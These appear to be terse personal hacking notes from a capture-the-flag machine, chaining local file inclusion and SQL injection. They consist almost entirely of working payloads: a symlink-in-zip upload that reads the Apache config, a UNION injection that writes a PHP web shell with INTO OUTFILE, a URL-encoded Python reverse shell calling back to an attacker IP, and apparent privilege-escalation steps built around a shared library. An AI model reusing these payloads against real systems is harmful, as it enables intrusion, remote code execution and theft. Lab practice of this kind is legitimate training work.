
# LFI
LFI via symbolic links and zipped pdf upload:
```
ln -s ../../../../etc/apache2/sites-available/000-default.conf test.pdf
zip --symlinks archive.zip test.pdf 
```

Visit uploaded file, which is a symlink to the apache config file. In burp, you can see the file contents

- apache config file leaks directory of wep application at `/var/www/html/`



```bash
quantity=1&product_id=
14564654' UNION select "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);}?>", '', '', '','','','','' from products into outfile '/var/lib/mysql/shell.php'; --
1
```



```bash
http://10.10.11.229/shop/index.php?page=/var/lib/mysql/shell&cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.16.18%22,1234));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
```


echo "St0ckM4nager\n1\n3" | strace stock


gcc -c -fPIC mylibrary.c -o mylibrary.o && gcc -shared -o libmylibrary.so mylibrary.o
